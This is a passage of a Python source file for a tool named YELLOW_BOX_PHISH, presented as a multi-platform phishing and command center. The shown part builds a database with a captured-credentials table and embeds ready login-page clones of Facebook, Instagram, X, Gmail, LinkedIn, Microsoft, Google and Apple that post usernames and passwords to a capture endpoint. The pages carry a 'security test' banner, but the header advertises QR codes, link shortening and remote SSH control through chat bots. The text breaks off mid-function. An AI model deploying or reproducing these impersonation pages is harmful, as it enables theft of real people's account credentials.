#!/usr/bin/env python3
"""
YELLOW_BOX_PHISH v2.0.0
Author: Ian Carter Kulani
Description: Ultimate Multi-Platform Phishing & Command Center
Features:
    - 5000+ Security Commands
    - Multi-Platform Bot Integration (Telegram, Discord, Slack, WhatsApp, iMessage, Signal)
    - Web Interface with Cyberpunk Terminal UI
    - Advanced Phishing Suite with Custom HTML Support
    - SSH Remote Access via All Platforms
    - REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)
    - Nikto Web Vulnerability Scanner
    - IP Management & Threat Detection
    - Custom Phishing Page Generator
    - QR Code Generation for Phishing Links
    - URL Shortening
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import getpass
import socketserver
import itertools
import string
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
import io
import pickle
import tempfile

# =====================
# ENCRYPTION
# =====================
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# =====================
# PLATFORM IMPORTS
# =====================

# SSH
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Signal
try:
    from signal import signal as signal_signal
    # Signal API is complex, we'll use a webhook-based approach
    SIGNAL_AVAILABLE = False  # Default to webhook approach
except ImportError:
    SIGNAL_AVAILABLE = False

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Flask for web UI
try:
    from flask import Flask, request, jsonify, render_template_string, send_from_directory
    from flask_socketio import SocketIO, emit
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

# Colorama
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# =====================
# YELLOW BOX THEME (Yellow/Black/Green)
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        PRIMARY = Fore.YELLOW + Style.BRIGHT
        SECONDARY = Fore.GREEN + Style.BRIGHT
        ACCENT = Fore.CYAN + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.BLUE + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        BLACK = Fore.BLACK + Style.BRIGHT
        RESET = Style.RESET_ALL
        BG_YELLOW = Back.YELLOW + Fore.BLACK
        BG_GREEN = Back.GREEN + Fore.BLACK
        BG_BLACK = Back.BLACK + Fore.YELLOW
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = YELLOW = GREEN = BLACK = BG_YELLOW = BG_GREEN = BG_BLACK = RESET = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".yellow_box_phish"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "yellow_box.db")
LOG_FILE = os.path.join(CONFIG_DIR, "yellow_box.log")
REPORT_DIR = "reports"
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
CUSTOM_PHISHING_DIR = os.path.join(CONFIG_DIR, "custom_phishing")
SIGNAL_SESSION_DIR = os.path.join(CONFIG_DIR, "signal_session")
WEB_UI_DIR = os.path.join(CONFIG_DIR, "web_ui")
WEBHOOKS_DIR = os.path.join(CONFIG_DIR, "webhooks")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR,
    NIKTO_RESULTS_DIR, WHATSAPP_SESSION_DIR, PHISHING_DIR, REPORT_DIR,
    TRAFFIC_LOGS_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, SSH_LOGS_DIR, TIME_HISTORY_DIR, WORDLISTS_DIR,
    CUSTOM_PHISHING_DIR, SIGNAL_SESSION_DIR, WEB_UI_DIR, WEBHOOKS_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - YELLOW_BOX - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("YellowBoxPhish")

# =====================
# DATA CLASSES
# =====================

class Severity:
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class SSHServer:
    id: str
    name: str
    host: str
    port: int
    username: str
    password: Optional[str] = None
    key_file: Optional[str] = None
    use_key: bool = False
    timeout: int = 30
    created_at: str = None
    status: str = "disconnected"
    notes: str = ""

@dataclass
class PhishingLink:
    id: str
    platform: str
    original_url: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0
    custom_html: Optional[str] = None
    qr_path: Optional[str] = None
    short_url: Optional[str] = None

@dataclass
class ManagedIP:
    ip_address: str
    added_by: str
    added_date: str
    notes: str
    is_blocked: bool = False

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "monitoring": {"enabled": True, "port_scan_threshold": 10},
        "scanning": {"default_ports": "1-1000", "timeout": 30},
        "security": {"auto_block": False, "log_level": "INFO"},
        "nikto": {"enabled": True, "timeout": 300},
        "traffic_generation": {"enabled": True, "max_duration": 300, "allow_floods": False},
        "social_engineering": {"enabled": True, "default_port": 8080, "capture_credentials": True},
        "ssh": {"enabled": True, "default_timeout": 30, "max_connections": 5},
        "discord": {"enabled": False, "token": "", "prefix": "!"},
        "telegram": {"enabled": False, "api_id": "", "api_hash": "", "bot_token": ""},
        "slack": {"enabled": False, "bot_token": "", "channel_id": "", "prefix": "!"},
        "whatsapp": {"enabled": False, "phone_number": "", "prefix": "/"},
        "imessage": {"enabled": False, "phone_numbers": [], "prefix": "!"},
        "signal": {"enabled": False, "webhook_url": "", "prefix": "!"},
        "web": {"enabled": True, "port": 8080},
        "phishing": {"default_port": 8080, "capture_credentials": True},
        "yellow_box": {"theme": "yellow", "version": "2.0.0"}
    }
    
    @staticmethod
    def load_config() -> Dict:
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    for key, value in ConfigManager.DEFAULT_CONFIG.items():
                        if key not in config:
                            config[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in config[key]:
                                    config[key][sub_key] = sub_value
                    return config
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        return ConfigManager.DEFAULT_CONFIG.copy()
    
    @staticmethod
    def save_config(config: Dict) -> bool:
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS workspaces (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS hosts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace_id INTEGER,
                ip_address TEXT NOT NULL,
                hostname TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                FOREIGN KEY (workspace_id) REFERENCES workspaces(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_servers (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password TEXT,
                key_file TEXT,
                use_key BOOLEAN DEFAULT 0,
                timeout INTEGER DEFAULT 30,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                status TEXT DEFAULT 'disconnected',
                notes TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                server_id TEXT NOT NULL,
                command TEXT NOT NULL,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                custom_html TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_path TEXT,
                short_url TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                platform TEXT NOT NULL,
                sender TEXT,
                message TEXT,
                response TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                user_id TEXT NOT NULL,
                username TEXT,
                authorized BOOLEAN DEFAULT 1,
                UNIQUE(platform, user_id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS web_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                ip_address TEXT
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self.create_default_workspace()
        self._init_phishing_templates()
    
    def create_default_workspace(self):
        try:
            self.cursor.execute('''
                INSERT OR IGNORE INTO workspaces (name, description, active)
                VALUES ('default', 'Default workspace', 1)
            ''')
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to create default workspace: {e}")
    
    def _init_phishing_templates(self):
        templates = self._get_all_templates()
        
        for name, html in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, name.split('_')[0], html))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_all_templates(self):
        return {
            "facebook": self._get_facebook_template(),
            "instagram": self._get_instagram_template(),
            "twitter": self._get_twitter_template(),
            "gmail": self._get_gmail_template(),
            "linkedin": self._get_linkedin_template(),
            "microsoft": self._get_microsoft_template(),
            "google": self._get_google_template(),
            "apple": self._get_apple_template(),
            "custom": self._get_custom_template()
        }
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.logo{color:#1877f2;font-size:40px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">facebook</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Instagram Login</title>
<style>
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border:1px solid #dbdbdb;padding:40px;width:350px;border-radius:1px}
.logo{font-size:50px;text-align:center;margin-bottom:30px}
input{width:100%;padding:9px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;box-sizing:border-box}
button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Instagram</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>X / Twitter</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea;margin:0}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center}
h2{text-align:center}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:#e7e9ea;box-sizing:border-box}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px;cursor:pointer}
.warning{margin-top:20px;padding:12px;background:#1a1a1a;border:1px solid #2f3336;text-align:center;border-radius:8px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">𝕏</div>
<h2>Sign in to X</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Gmail</title>
<style>
body{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:28px;padding:48px;width:450px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
.logo{color:#1a73e8;font-size:24px;text-align:center}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:30px;padding:12px;background:#e8f0fe;text-align:center;border-radius:8px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Gmail</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>LinkedIn Login</title>
<style>
body{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 4px 12px rgba(0,0,0,0.15)}
.logo{color:#0a66c2;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px;cursor:pointer}
.warning{margin-top:24px;padding:12px;background:#fff3cd;text-align:center;border-radius:4px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">LinkedIn</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_microsoft_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Microsoft Sign in</title>
<style>
body{background:#f3f3f3;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#f25022;font-size:28px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;border-radius:4px;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Microsoft</div>
<h3>Sign in</h3>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_google_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Google Account</title>
<style>
body{background:#f8f9fa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:48px 40px;width:450px;box-shadow:0 1px 3px rgba(0,0,0,0.1)}
.logo{text-align:center;color:#4285f4;font-size:32px}
input{width:100%;padding:13px 15px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#e8f0fe;border-radius:8px;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Google</div>
<h2>Sign in</h2>
<p>to continue to Google Account</p>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_apple_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Apple ID</title>
<style>
body{background:#f5f5f7;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:18px;padding:40px;width:400px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
.logo{text-align:center;font-size:50px}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:12px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0071e3;color:white;border:none;border-radius:12px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;border-radius:8px;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">🍎</div>
<h2>Sign in to Apple ID</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_custom_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Secure Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#FFD700 0%,#FFA500 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#FFD700;font-size:28px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:14px;background:linear-gradient(135deg,#FFD700 0%,#FFA500 100%);color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#f8d7da;border-radius:8px;color:#721c24;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>🔒 Secure Portal</h1></div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def get_active_workspace(self) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM workspaces WHERE active = 1')
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get active workspace: {e}")
            return None
    
    def add_host(self, ip: str, hostname: str = None) -> Optional[int]:
        try:
            workspace = self.get_active_workspace()
            if not workspace:
                return None
            self.cursor.execute('''
                INSERT OR REPLACE INTO hosts (workspace_id, ip_address, hostname, last_seen)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (workspace['id'], ip, hostname))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add host: {e}")
            return None
    
    def log_command(self, command: str, source: str = "local", platform: str = "local",
                   success: bool = True, output: str = "", execution_time: float = 0.0):
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, platform, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (command, source, platform, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_threat(self, alert, platform: str = None):
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken, platform)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip,
                  alert.severity, alert.description, alert.action_taken, platform))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_platform_message(self, platform: str, sender: str, message: str, response: str):
        try:
            self.cursor.execute('''
                INSERT INTO platform_messages (platform, sender, message, response)
                VALUES (?, ?, ?, ?)
            ''', (platform, sender, message[:500], response[:1000]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log message: {e}")
    
    def add_ssh_server(self, server: SSHServer) -> bool:
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_servers 
                (id, name, host, port, username, password, key_file, use_key, timeout, notes, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server.id, server.name, server.host, server.port, server.username,
                  server.password, server.key_file, server.use_key, server.timeout,
                  server.notes, server.created_at or datetime.datetime.now().isoformat()))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return False
    
    def get_ssh_servers(self) -> List[Dict]:
        try:
            self.cursor.execute('SELECT * FROM ssh_servers ORDER BY name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH servers: {e}")
            return []
    
    def get_ssh_server(self, server_id: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM ssh_servers WHERE id = ?', (server_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get SSH server: {e}")
            return None
    
    def delete_ssh_server(self, server_id: str) -> bool:
        try:
            self.cursor.execute('DELETE FROM ssh_servers WHERE id = ?', (server_id,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to delete SSH server: {e}")
            return False
    
    def update_ssh_server_status(self, server_id: str, status: str):
        try:
            self.cursor.execute('''
                UPDATE ssh_servers SET status = ?, last_used = CURRENT_TIMESTAMP WHERE id = ?
            ''', (status, server_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH server status: {e}")
    
    def log_ssh_command(self, server_id: str, command: str, success: bool,
                       output: str, execution_time: float = 0.0, executed_by: str = "system"):
        try:
            self.cursor.execute('''
                INSERT INTO ssh_commands (server_id, command, success, output, execution_time, executed_by)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (server_id, command, success, output[:5000], execution_time, executed_by))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log SSH command: {e}")
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT command, source, platform, timestamp, success FROM command_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_traffic_logs(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT ?', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    def get_nikto_scans(self, limit: int = 10) -> List[Dict]:
        try:
